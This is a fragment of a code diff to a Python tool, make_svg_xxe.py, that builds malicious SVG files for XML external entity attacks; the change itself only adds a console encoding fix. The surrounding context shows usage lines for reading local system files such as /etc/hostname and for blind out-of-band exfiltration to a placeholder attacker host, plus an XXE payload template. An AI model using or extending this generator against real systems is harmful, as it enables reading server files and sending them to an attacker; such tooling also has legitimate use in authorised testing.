@@ -12,7 +12,11 @@ Usage:
   python3 make_svg_xxe.py -o evil.svg --file file:///etc/hostname          # in-band (view the rendered SVG/PNG)
   python3 make_svg_xxe.py -o evil.svg --oob YOUR-HOST:8000                  # blind OOB
 """
-import argparse
+import argparse, sys
+try:
+    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # never crash a cp1252 console
+except Exception:
+    pass
 
 INBAND = ('<?xml version="1.0" standalone="yes"?>\n'
           '<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "{fileuri}"> ]>\n'
